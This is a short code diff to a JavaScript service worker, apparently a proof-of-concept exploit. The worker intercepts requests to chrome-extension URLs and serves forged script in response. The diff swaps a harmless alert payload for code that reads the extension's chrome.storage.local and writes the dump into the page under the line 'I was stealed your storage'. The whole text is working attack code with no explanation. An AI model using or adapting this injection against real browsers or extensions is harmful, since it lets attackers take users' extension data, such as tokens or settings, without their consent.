@@ -6,8 +6,9 @@ self.addEventListener("fetch", (event) => {
     }
     if(event.request.url.indexOf("chrome-extension") != -1){
         var a =             new Response(`(async function foo() {
-                                console.log('this is content-script print');
-                                window.alert('123')
+            window.slonser=JSON.stringify(await chrome.storage.local.get());
+
+            document.body.innerHTML='I was stealed your storage:'+window.slonser; 
           })();`, {
           headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':"*"}
         })
